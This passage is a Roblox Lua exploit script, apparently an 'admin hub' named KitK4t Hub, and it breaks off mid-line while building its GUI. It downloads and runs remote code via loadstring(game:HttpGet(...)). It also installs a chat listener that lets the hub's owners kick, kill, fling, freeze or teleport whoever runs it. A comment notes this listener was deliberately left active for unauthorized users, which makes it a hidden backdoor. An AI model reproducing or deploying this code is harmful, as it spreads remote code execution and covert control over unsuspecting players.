local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

-- Lista de jogadores autorizados
local AUTHORIZED_PLAYERS = loadstring(game:HttpGet("https://raw.githubusercontent.com/KitK4tHub/users/refs/heads/main/users/allow.lua"))()

-- Lista de tags especiais
local SPECIAL_TAGS = {
    ["Breno010L"] = "Dono KitK4t",
    ["shawnlovebazuka"] = "Sub dona KitK4t"
}

-- Armazenar tags personalizadas
local ActiveTags = {}

-- Função para verificar se o jogador está autorizado
local function IsPlayerAuthorized()
    for _, authorizedName in ipairs(AUTHORIZED_PLAYERS) do
        if LocalPlayer.Name == authorizedName then
            return true
        end
    end
    return false
end

-- OBS: removido `return` aqui para que o script continue executando mesmo que o jogador não esteja autorizado.
-- A GUI será mostrada somente para jogadores autorizados (ver mais abaixo).

-- Tamanhos da interface
local interfaceConfig = {
    width = 280,
    height = 350,
    buttonHeight = 30,
    titleHeight = 25,
    fontSize = 11,
    titleFontSize = 12
}

-- Função para autocompletar nomes
local function AutoCompleteName(partialName)
    if partialName == "" then return nil end

    local lowerPartial = string.lower(partialName)
    local allPlayers = Players:GetPlayers()

    -- Primeiro procura nos jogadores autorizados
    for _, authorizedName in ipairs(AUTHORIZED_PLAYERS) do
        if string.lower(authorizedName):sub(1, #lowerPartial) == lowerPartial then
            return authorizedName
        end
    end

    -- Depois procura em todos os jogadores online
    for _, player in ipairs(allPlayers) do
        if player ~= LocalPlayer then
            local playerName = player.Name
            if string.lower(playerName):sub(1, #lowerPartial) == lowerPartial then
                return playerName
            end
        end
    end

    return nil
end

-- Efeito especial de fogo azul do Bill Cipher
local function CreateBillCipherEffect()
    local character = LocalPlayer.Character
    if not character then return end

    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end

    local fire = Instance.new("Fire")
    fire.Name = "BillCipherFire"
    fire.Color = Color3.fromRGB(0, 100, 255)
    fire.SecondaryColor = Color3.fromRGB(0, 200, 255)
    fire.Size = 8
    fire.Heat = 2
    fire.Parent = humanoidRootPart

    task.delay(2, function()
        if fire then fire:Destroy() end
    end)
end

-- Função para criar tag acima da cabeça do jogador
local function CreatePlayerTag(playerName, tagText)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer then return false end

    local character = targetPlayer.Character
    if not character then return false end

    local head = character:FindFirstChild("Head")
    if not head then return false end

    -- Remover tag anterior se existir
    RemovePlayerTag(playerName)

    -- Criar BillboardGui para a tag
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "KitK4tTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 150, 0, 30)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 80
    billboard.Parent = character

    -- Frame principal da tag
    local tagFrame = Instance.new("Frame")
    tagFrame.Size = UDim2.new(1, 0, 1, 0)
    tagFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    tagFrame.BackgroundTransparency = 0.3
    tagFrame.BorderSizePixel = 0
    tagFrame.Parent = billboard

    local tagCorner = Instance.new("UICorner")
    tagCorner.CornerRadius = UDim.new(0, 6)
    tagCorner.Parent = tagFrame

    -- Texto da tag
    local tagLabel = Instance.new("TextLabel")
    tagLabel.Size = UDim2.new(1, -8, 1, -8)
    tagLabel.Position = UDim2.new(0, 4, 0, 4)
    tagLabel.BackgroundTransparency = 1
    tagLabel.Text = tagText
    tagLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    tagLabel.TextSize = 10
    tagLabel.Font = Enum.Font.GothamBold
    tagLabel.TextStrokeTransparency = 0
    tagLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    tagLabel.Parent = tagFrame

    -- Efeito de brilho
    local glow = Instance.new("UIStroke")
    glow.Color = Color3.fromRGB(0, 100, 255)
    glow.Thickness = 1
    glow.Parent = tagFrame

    -- Salvar tag ativa
    ActiveTags[playerName] = {
        Billboard = billboard,
        TagText = tagText
    }

    return true
end

-- Função para remover tag
local function RemovePlayerTag(playerName)
    if ActiveTags[playerName] then
        local tagData = ActiveTags[playerName]
        if tagData.Billboard and tagData.Billboard.Parent then
            tagData.Billboard:Destroy()
        end
        ActiveTags[playerName] = nil
        return true
    end
    return false
end

-- Função para aplicar tag especial
local function ApplySpecialTag(playerName)
    local tag = SPECIAL_TAGS[playerName]
    if tag then
        return CreatePlayerTag(playerName, tag)
    end
    return false
end

-- Função para aplicar tag personalizada
local function ApplyCustomTag(playerName, customTag)
    if customTag and customTag ~= "" then
        return CreatePlayerTag(playerName, customTag)
    end
    return false
end

-- Envia comandos via chat
local function SendCommandMessage(command, target)
    CreateBillCipherEffect()

    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        local msg = "$$$" .. command
        if target then msg = msg .. " " .. target end
        channel:SendAsync(msg)
    else
        local msg = "$$$" .. command .. (target and (" " .. target) or "")
        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
            .SayMessageRequest:FireServer(msg, "All")
    end
end

-- Obter personagem
local function GetCharacter(playerName)
    local plr = Players:FindFirstChild(playerName)
    return plr and plr.Character or nil
end

-- Funções de comandos básicas
local function Kick(playerName)
    if playerName == LocalPlayer.Name then
        LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.")
    end
end

local loopKill = false
local function LoopKill(playerName)
    if playerName == LocalPlayer.Name then
        loopKill = not loopKill
        if loopKill then
            task.spawn(function()
                while loopKill do
                    if LocalPlayer.Character then
                        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                        if hum then hum.Health = 0 end
                    end
                    task.wait(0.3)
                end
            end)
        end
    end
end

local function KillPlus(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            CreateBillCipherEffect()
            char:BreakJoints()
        end
    end
end

local function Fling(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                CreateBillCipherEffect()
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local tween = TweenService:Create(root, tweenInfo, {CFrame = CFrame.new(50000, 5000000, 3972823)})
                tween:Play()
            end
        end
    end
end

local function Freeze(playerName)
    if playerName == LocalPlayer.Name then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            CreateBillCipherEffect()
            char.HumanoidRootPart.Anchored = true
        end
    end
end

local function UnFreeze(playerName)
    if playerName == LocalPlayer.Name then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = false
        end
    end
end

local function Bring(playerName)
    if playerName == LocalPlayer.Name then
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local sender = nil
            for _, plr in ipairs(Players:GetPlayers()) do
                if ActiveTags[plr.Name] then
                    sender = plr
                    break
                end
            end
            if sender and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
                CreateBillCipherEffect()
                hrp.CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end
end

local function Verifique()
    CreateBillCipherEffect()
    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync("KitK4t_" .. math.random(1000, 9999))
    end
end

-- Processar comandos do chat
local function HandleChatCommand(text)
    if not text or type(text) ~= "string" then return end
    if string.sub(text, 1, 3) == "$$$" then
        local args = string.split(text, " ")
        local command = string.lower(string.sub(args[1], 4))
        local target = args[2]

        if command == "kick" then Kick(target) end
        if command == "loopkill" then LoopKill(target) end
        if command == "killplus" then KillPlus(target) end
        if command == "fling" then Fling(target) end
        if command == "freeze" then Freeze(target) end
        if command == "unfreeze" then UnFreeze(target) end
        if command == "bring" then Bring(target) end
        if command == "verifique" then Verifique() end
    end
end

-- Sistema de chat
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if message and message.Text then
            HandleChatCommand(message.Text)
        end
    end)
end)

for _, plr in ipairs(Players:GetPlayers()) do
    plr.Chatted:Connect(HandleChatCommand)
end
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(HandleChatCommand)
end)

-- 🧭 INTERFACE
-- Apenas cria e mostra a interface para jogadores autorizados.
if IsPlayerAuthorized() then
    task.spawn(function()
        task.wait(1)

        -- Criar a interface principal
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "KitK4tHub"
        ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        ScreenGui.ResetOnSpawn = false

        -- Frame principal
        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Size = UDim2.new(0, interfaceConfig.width, 0, interfaceConfig.height)
        MainFrame.Position = UDim2.new(0.5, -interfaceConfig.width/2, 0.5, -interfaceConfig.height/2)
        MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
        MainFrame.BorderSizePixel = 0
        MainFrame.ClipsDescendants = true
        MainFrame.Parent = ScreenGui

        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 8)
        UICorner.Parent = MainFrame

        -- Barra de título
        local TitleBar = Instance.new("Frame")
        TitleBar.Name = "TitleBar"
        TitleBar.Size = UDim2.new(1, -10, 0, interfaceConfig.titleHeight)
        TitleBar.Position = UDim2.new(0, 5, 0, 5)
        TitleBar.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
        TitleBar.BorderSizePixel = 0
        TitleBar.Parent = MainFrame

        local TitleCorner = Instance.new("UICorner")
        TitleCorner.CornerRadius = UDim.new(0, 6)
        TitleCorner.Parent = TitleBar

        local TitleLabel = Instance.new("TextLabel")
        TitleLabel.Name = "TitleLabel"
        TitleLabel.Size = UDim2.new(1, -50, 1, 0)
        TitleLabel.Position = UDim2.new(0, 8, 0, 0)
        TitleLabel.BackgroundTransparency = 1
        TitleLabel.Text = "🔮 KitK4t Hub | Admin"
        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        TitleLabel.TextSize = interfaceConfig.titleFontSize
        TitleLabel.Font = Enum.Font.GothamBold
        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
        TitleLabel.Parent = TitleBar

        -- Botão fechar
        local CloseButton = Instance.new("TextButton")
        CloseButton.Name = "CloseButton"
        CloseButton.Size = UDim2.new(0, 20, 0, 20)
        CloseButton.Position = UDim2.new(1, -25, 0.5, -10)
        CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        CloseButton.BorderSizePixel = 0
        CloseButton.Text = "×"
        CloseButton.TextColor3 = Color3.fromRGB(0, 100, 255)
        CloseButton.TextSize = 14
        CloseButton.Font = Enum.Font.GothamBold
        CloseButton.Parent = TitleBar

        local CloseCorner = Instance.new("UICorner")
        CloseCorner.CornerRadius = UDim.new(1, 0)
        CloseCorner.Parent = CloseButton

        -- Conteúdo principal
        local ContentFrame = Instance.new("Frame")
        ContentFrame.Name = "ContentFrame"
        ContentFrame.Size = UDim2.new(1, 0, 1, -interfaceConfig.titleHeight - 10)
        ContentFrame.Position = UDim2.new(0, 0, 0, interfaceConfig.titleHeight + 5)
        ContentFrame.BackgroundTransparency = 1
        ContentFrame.BorderSizePixel = 0
        ContentFrame.Parent = MainFrame

        -- ScrollingFrame
        local ScrollingFrame = Instance.new("ScrollingFrame")
        ScrollingFrame.Name = "ScrollingFrame"
        ScrollingFrame.Size = UDim2.new(1, -10, 1, -10)
        ScrollingFrame.Position = UDim2.new(0, 5, 0, 5)
        ScrollingFrame.BackgroundTransparency = 1
        ScrollingFrame.BorderSizePixel = 0
        ScrollingFrame.ScrollBarThickness = 3
        ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 100, 255)
        ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        ScrollingFrame.Parent = ContentFrame

        -- TextBox para jogador
        local PlayerTextBox = Instance.new("TextBox")
        PlayerTextBox.Name = "PlayerTextBox"
        PlayerTextBox.Size = UDim2.new(1, 0, 0, interfaceConfig.buttonHeight)
        PlayerTextBox.Position = UDim2.new(0, 0, 0, 0)
        PlayerTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
        PlayerTextBox.BorderSizePixel = 0
        PlayerTextBox.Text = ""
        PlayerTextBox.PlaceholderText = "Digite nome (autocompleta)..."
        PlayerTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        PlayerTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 180)
        PlayerTextBox.TextSize = interfaceConfig.fontSize
        PlayerTextBox.Font = Enum.Font.Gotham
        PlayerTextBox.TextXAlignment = Enum.TextXAlignment.Left
        PlayerTextBox.Parent = ScrollingFrame

        local TextBoxCorner = Instance.new("UICorner")
        TextBoxCorner.CornerRadius = UDim.new(0, 5)
        TextBoxCorner.Parent = PlayerTextBox

        local TextBoxPadding = Instance.new("UIPadding")
        TextBoxPadding.PaddingLeft = UDim.new(0, 8)
        TextBoxPadding.Parent = PlayerTextBox

        -- TextBox para tag personalizada
        local CustomTagTextBox = Instance.new("TextBox")
        CustomTagTextBox.Name = "CustomTagTextBox"
        CustomTagTextBox.Size = UDim2.new(1, 0, 0, inte
